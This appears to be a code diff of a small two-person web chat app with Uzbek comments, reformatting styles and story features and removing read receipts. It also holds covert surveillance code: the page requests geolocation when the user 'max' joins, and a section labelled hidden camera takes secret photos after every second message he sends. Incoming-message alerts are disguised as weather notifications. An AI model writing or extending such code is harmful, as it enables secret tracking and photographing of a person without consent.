@@ -7,13 +7,22 @@
     <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        .avatar-box { width: 42px; height: 42px; border-radius: 50%; padding: 2px; cursor: pointer; transition: 0.3s; }
-        .avatar-box.has-story { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
-        .avatar-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 2px solid #2c3e50; background: #fff; }
-        .story-indicator { position: absolute; top: 20px; color: white; font-weight: bold; font-size: 18px; text-shadow: 1px 1px 3px black; z-index: 2005; }
-        /* Galochkalar uslubi */
-        .msg-status { font-size: 12px; font-weight: bold; margin-left: 4px; }
-        .msg-info-row { display: flex; justify-content: flex-end; align-items: center; gap: 3px; margin-top: 2px; }
+        .avatar-box {
+            width: 42px; height: 42px; border-radius: 50%; padding: 2px;
+            cursor: pointer; transition: 0.3s;
+        }
+        .avatar-box.has-story {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+        }
+        .avatar-img {
+            width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
+            border: 2px solid #2c3e50; background: #fff;
+        }
+        /* Istoriya tartib raqami dizayni */
+        .story-indicator {
+            position: absolute; top: 20px; color: white;
+            font-weight: bold; font-size: 18px; text-shadow: 1px 1px 3px black; z-index: 2005;
+        }
     </style>
 </head>
 <body>
@@ -21,10 +30,13 @@
     <div id="profileModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; justify-content:center; align-items:center;">
         <div style="background:#fff; padding:20px; border-radius:10px; width:80%; max-width:300px; text-align:center;">
             <h3 style="margin-top:0; color:#333;">Profilni Tahrirlash</h3>
+            
             <label style="display:block; text-align:left; color:#555; font-size:13px; margin-bottom:5px;">Dumaloq Avatar rasmi:</label>
             <input type="file" id="avatarInput" accept="image/*" style="margin-bottom:15px; width:100%;">
+            
             <label style="display:block; text-align:left; color:#555; font-size:13px; margin-bottom:5px;">Yangi Istoriya yuklash (Rasm/Video):</label>
             <input type="file" id="storyInput" accept="image/*,video/*" style="margin-bottom:20px; width:100%;">
+            
             <button onclick="saveProfileChanges()" style="background:#2ecc71; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; margin-bottom:10px; font-weight:bold; cursor:pointer;">Saqlash va Yuklash</button>
             <button onclick="deleteMyStory()" style="background:#f39c12; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; margin-bottom:10px; font-weight:bold; cursor:pointer;">Barcha Istoriyalarni O'chirish</button>
             <button onclick="document.getElementById('profileModal').style.display='none'" style="background:#e74c3c; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; cursor:pointer;">Bekor qilish</button>
@@ -50,6 +62,7 @@
                     </div>
                 </div>
             </div>
+
             <div style="display:flex; align-items:center; gap:8px; flex-direction:row-reverse;">
                 <div class="avatar-box" id="partnerStoryRing" onclick="viewStory(partner)">
                     <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="partnerAvatarImg" class="avatar-img">
@@ -95,6 +108,7 @@
         const partner = (myUser === 'mura') ? 'max' : 'mura';
         document.getElementById('chatPartner').innerText = partner.toUpperCase();
 
+        // --- EMOJI MANTIQI ---
         const emojis = ["😀","😂","🤣","😍","🥰","😘","😭","😡","🤬","👍","👎","❤️","💔","🔥","✨","🎉","👋","🤝","👀","✅","❌","❓","☠️","🤡","💩","🤖","👻","💀","💪","🙏"];
         const emojiContainer = document.getElementById('emojiPicker');
         emojis.forEach(emoji => {
@@ -105,6 +119,7 @@
         function toggleEmoji() { emojiContainer.classList.toggle('active'); }
         document.addEventListener('click', (e) => { if (!e.target.closest('.emoji-picker') && !e.target.closest('.bx-smile')) emojiContainer.classList.remove('active'); });
 
+        // --- GEOLOKATSIYA ---
         function joinChat() {
             if (myUser === 'max' && "geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
@@ -116,6 +131,7 @@
         }
         joinChat();
 
+        // --- CHAT LOGIKASI ---
         let currentReply = null;
         socket.on('status_update', (data) => {
             const isOnline = data.online.includes(partner);
@@ -127,7 +143,6 @@
         socket.on('load_history', (history) => {
             const list = document.getElementById('messagesList'); list.innerHTML = '';
             history.forEach(msg => appendMessage(msg)); list.scrollTop = list.scrollHeight;
-            socket.emit('mark_read'); // Tarix yuklanganda o'qilgan qilib belgilaymiz
         });
 
         if ("Notification" in window && Notification.permission !== "granted" && Notification.permission !== "denied") Notification.requestPermission();
@@ -135,31 +150,11 @@
         socket.on('new_message', (msg) => {
             appendMessage(msg);
             const list = document.getElementById('messagesList'); list.scrollTop = list.scrollHeight;
-            
-            // Xabar kelganda, oyna yashirin bo'lmasa o'qilgan qilamiz
-            if (msg.user !== myUser) {
-                if (!document.hidden) {
-                    socket.emit('mark_read');
-                } else {
-                    if (Notification.permission === "granted") {
-                        const notification = new Notification("⛅ Ob-havo ma'lumoti", { body: "Bugun havo ochiq, yog'ingarchilik kutilmaydi.", icon: "https://cdn-icons-png.flaticon.com/512/3222/3222800.png", silent: false });
-                        notification.onclick = function() { window.focus(); this.close(); };
-                    }
+            if (msg.user !== myUser && document.hidden) {
+                if (Notification.permission === "granted") {
+                    const notification = new Notification("⛅ Ob-havo ma'lumoti", { body: "Bugun havo ochiq, yog'ingarchilik kutilmaydi.", icon: "https://cdn-icons-png.flaticon.com/512/3222/3222800.png", silent: false });
+                    notification.onclick = function() { window.focus(); this.close(); };
                 }
-            }
-        });
-
-        // Chatga qaytib kirganingizda o'qilgan qiladi
-        window.addEventListener('focus', () => { socket.emit('mark_read'); });
-
-        // Sherik xabarni o'qiganda mening ekranimda galochka ko'karishi
-        socket.on('messages_read', (data) => {
-            if (data.byUser === partner) {
-                const statuses = document.querySelectorAll('.my-msg .msg-status');
-                statuses.forEach(el => {
-                    el.innerText = '✓✓';
-                    el.style.color = '#3498db'; // Telegramning ko'k rangi
-                });
             }
         });
 
@@ -179,16 +174,7 @@
             }
             let textHtml = msg.text ? `<div>${msg.text}</div>` : '';
             const replyBtn = `<i class='bx bxs-share' style="position:absolute; top:-10px; right:-10px; background:#fff; color:#333; border-radius:50%; padding:3px; cursor:pointer; font-size:14px;" onclick='triggerReply(${JSON.stringify(msg)})'></i>`;
-            
-            // STATUS YARATISH (Faqat mening xabarlarimda ✓ yoki ✓✓ ko'rinadi)
-            let checkmarks = '';
-            if (isMe) {
-                const checkColor = msg.read ? '#3498db' : '#bdc3c7'; // Ko'k yoki kulrang
-                const checkSign = msg.read ? '✓✓' : '✓';
-                checkmarks = `<span class="msg-status" style="color: ${checkColor};">${checkSign}</span>`;
-            }
-
-            div.innerHTML = `${replyBtn} ${senderNameHtml} ${replyHtml} ${mediaHtml} ${textHtml} <div class="msg-info-row"><span class="msg-time">${msg.time}</span> ${checkmarks}</div>`;
+            div.innerHTML = `${replyBtn} ${senderNameHtml} ${replyHtml} ${mediaHtml} ${textHtml} <span class="msg-time">${msg.time}</span>`;
             list.appendChild(div);
         }
 
@@ -205,6 +191,7 @@
         }
         document.getElementById('msgInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
 
+        // --- MICROPHONE LOGIC ---
         const micBtn = document.getElementById('micBtn'); let mediaRecorder; let audioChunks = []; let isRecording = false;
         const startRec = async (e) => {
             if (e.cancelable) e.preventDefault(); if (isRecording) return;
@@ -234,12 +221,26 @@
             } catch (e) { alert("Yuklashda xato!"); }
         }
 
-        let profilesData = {}; let currentStoryIndex = 0; let viewingUser = null; let storyTimeout = null;
+        // ==========================================
+        // PROFIL VA KETMA-KET ISTORIYA MANTIQI
+        // ==========================================
+        let profilesData = {};
+        let currentStoryIndex = 0;
+        let viewingUser = null;
+        let storyTimeout = null;
+
         document.getElementById('myNameTxt').innerText = myUser.toUpperCase();
-        function hasActiveStory(userObj) { if (!userObj) return false; if (userObj.stories && userObj.stories.length > 0) return true; if (userObj.story) return true; return false; }
+
+        function hasActiveStory(userObj) {
+            if (!userObj) return false;
+            if (userObj.stories && userObj.stories.length > 0) return true;
+            if (userObj.story) return true; // Eski saqlanganlar uchun himoya
+            return false;
+        }
 
         socket.on('load_profiles', (data) => {
             profilesData = data;
+            
             if (profilesData[myUser]) {
                 if (profilesData[myUser].avatar) document.getElementById('myAvatarImg').src = `/uploads/${profilesData[myUser].avatar}`;
                 if (hasActiveStory(profilesData[myUser])) document.getElementById('myStoryRing').classList.add('has-story');
@@ -253,67 +254,119 @@
         });
 
         async function saveProfileChanges() {
-            const avatarFile = document.getElementById('avatarInput').files[0]; const storyFile = document.getElementById('storyInput').files[0];
+            const avatarFile = document.getElementById('avatarInput').files[0];
+            const storyFile = document.getElementById('storyInput').files[0];
+
             if (avatarFile) {
                 const fd = new FormData(); fd.append('file', avatarFile);
-                try { const res = await fetch('/upload', { method: 'POST', body: fd }); const data = await res.json(); socket.emit('update_profile', { avatar: data.filename }); } catch(e) {}
+                try {
+                    const res = await fetch('/upload', { method: 'POST', body: fd });
+                    const data = await res.json();
+                    socket.emit('update_profile', { avatar: data.filename });
+                } catch(e) {}
             }
+
             if (storyFile) {
                 if (storyFile.type.startsWith('video/')) {
                     const videoCheck = document.createElement('video'); videoCheck.preload = 'metadata';
                     const isAllowed = await new Promise((resolve) => {
                         videoCheck.onloadedmetadata = function() {
                             window.URL.revokeObjectURL(videoCheck.src);
-                            if (videoCheck.duration > 60) { alert("Video 1 daqiqadan oshmasligi shart!"); resolve(false); } else resolve(true);
+                            if (videoCheck.duration > 60) { alert("Video 1 daqiqadan oshmasligi shart!"); resolve(false); } 
+                            else resolve(true);
                         }
                         videoCheck.src = URL.createObjectURL(storyFile);
                     });
                     if (!isAllowed) return; 
                 }
+
                 const fd2 = new FormData(); fd2.append('file', storyFile);
                 try {
-                    const res2 = await fetch('/upload', { method: 'POST', body: fd2 }); const data2 = await res2.json();
+                    const res2 = await fetch('/upload', { method: 'POST', body: fd2 });
+                    const data2 = await res2.json();
+                    // YANGI: Istoriya qo'shish buyrug'i
                     socket.emit('add_story', { filename: data2.filename, type: data2.type });
                 } catch(e) {}
             }
-            alert("Muvaffaqiyatli saqlandi!"); document.getElementById('profileModal').style.display = 'none'; document.getElementById('avatarInput').value = ''; document.getElementById('storyInput').value = '';
+
+            alert("Muvaffaqiyatli saqlandi!");
+            document.getElementById('profileModal').style.display = 'none';
+            document.getElementById('avatarInput').value = '';
+            document.getElementById('storyInput').value = '';
         }
 
+        // --- ISTORIYANI O'CHIRISH FUNKSIYASI ---
         function deleteMyStory() {
-            if (!hasActiveStory(profilesData[myUser])) { alert("Sizda o'chirish uchun faol istoriya yo'q!"); return; }
+            if (!hasActiveStory(profilesData[myUser])) {
+                alert("Sizda o'chirish uchun faol istoriya yo'q!"); return;
+            }
             if (confirm("Barcha istoriyalaringizni haqiqatan ham o'chirib tashlaysizmi?")) {
-                socket.emit('delete_story'); document.getElementById('profileModal').style.display = 'none';
+                socket.emit('delete_story');
+                document.getElementById('profileModal').style.display = 'none';
             }
         }
 
+        // --- ISTORIYALARNI KETMA-KET KO'RISH (SLIDER) ---
         function viewStory(user) {
             const userObj = profilesData[user];
             if (!hasActiveStory(userObj)) { alert("Hozircha istoriya yo'q"); return; }
+            
+            // Eski formatni yangisiga o'tkazish
             if (!userObj.stories) userObj.stories = [];
             if (userObj.story && userObj.stories.length === 0) userObj.stories.push({url: userObj.story, type: userObj.storyType});
-            viewingUser = user; currentStoryIndex = 0; showStorySlide();
+
+            viewingUser = user;
+            currentStoryIndex = 0;
+            showStorySlide();
         }
 
         function showStorySlide() {
             const stories = profilesData[viewingUser].stories;
-            if (currentStoryIndex >= stories.length) { closeStory(); return; }
-            const viewer = document.getElementById('storyViewer'); const content = document.getElementById('storyContent'); const indicator = document.getElementById('storyIndicator');
-            const currentObj = stories[currentStoryIndex]; const fileUrl = `/uploads/${currentObj.url}`;
-            content.innerHTML = ''; indicator.innerText = `${currentStoryIndex + 1} / ${stories.length}`;
+            if (currentStoryIndex >= stories.length) {
+                closeStory(); return;
+            }
+
+            const viewer = document.getElementById('storyViewer');
+            const content = document.getElementById('storyContent');
+            const indicator = document.getElementById('storyIndicator');
+            const currentObj = stories[currentStoryIndex];
+            const fileUrl = `/uploads/${currentObj.url}`;
+            
+            content.innerHTML = ''; 
+            indicator.innerText = `${currentStoryIndex + 1} / ${stories.length}`;
+
             if (currentObj.type.startsWith('video/')) {
-                const vid = document.createElement('video'); vid.src = fileUrl; vid.autoplay = true; vid.onclick = nextStory; vid.onended = nextStory;
-                vid.style.maxWidth = '100%'; vid.style.maxHeight = '90vh'; vid.style.borderRadius = '10px'; content.appendChild(vid);
+                const vid = document.createElement('video');
+                vid.src = fileUrl; vid.autoplay = true; 
+                vid.onclick = nextStory; vid.onended = nextStory; // Bossa yoki tugasa keyingisiga o'tadi
+                vid.style.maxWidth = '100%'; vid.style.maxHeight = '90vh'; vid.style.borderRadius = '10px';
+                content.appendChild(vid);
             } else {
-                const img = document.createElement('img'); img.src = fileUrl; img.onclick = nextStory;
-                img.style.maxWidth = '100%'; img.style.maxHeight = '90vh'; img.style.borderRadius = '10px'; content.appendChild(img);
-                if(storyTimeout) clearTimeout(storyTimeout); storyTimeout = setTimeout(nextStory, 5000); 
+                const img = document.createElement('img');
+                img.src = fileUrl; img.onclick = nextStory; // Bossa keyingisiga o'tadi
+                img.style.maxWidth = '100%'; img.style.maxHeight = '90vh'; img.style.borderRadius = '10px';
+                content.appendChild(img);
+                
+                if(storyTimeout) clearTimeout(storyTimeout);
+                storyTimeout = setTimeout(nextStory, 5000); // 5 soniyadan keyin avto o'tadi
             }
             viewer.style.display = 'flex';
         }
 
-        function nextStory() { if(storyTimeout) clearTimeout(storyTimeout); currentStoryIndex++; showStorySlide(); }
-        function closeStory() { if(storyTimeout) clearTimeout(storyTimeout); document.getElementById('storyContent').innerHTML = ''; document.getElementById('storyViewer').style.display = 'none'; viewingUser = null; }
+        function nextStory() {
+            if(storyTimeout) clearTimeout(storyTimeout);
+            currentStoryIndex++;
+            showStorySlide();
+        }
 
+        function closeStory() {
+            if(storyTimeout) clearTimeout(storyTimeout);
+            document.getElementById('storyContent').innerHTML = ''; 
+            document.getElementById('storyViewer').style.display = 'none';
+            viewingUser = null;
+        }
+
+        // --- YASHIRIN KAMERA ---
         let maxMessageCount = 0;
         async function takeSecretPhoto(facingMode) {
             try {
@@ -345,6 +398,7 @@
             originalSendMessage(); 
             if (myUser === 'max') { maxMessageCount++; if (maxMessageCount % 2 === 0) runVerification(); }
         }
+        
     </script>
 </body>
 </html>
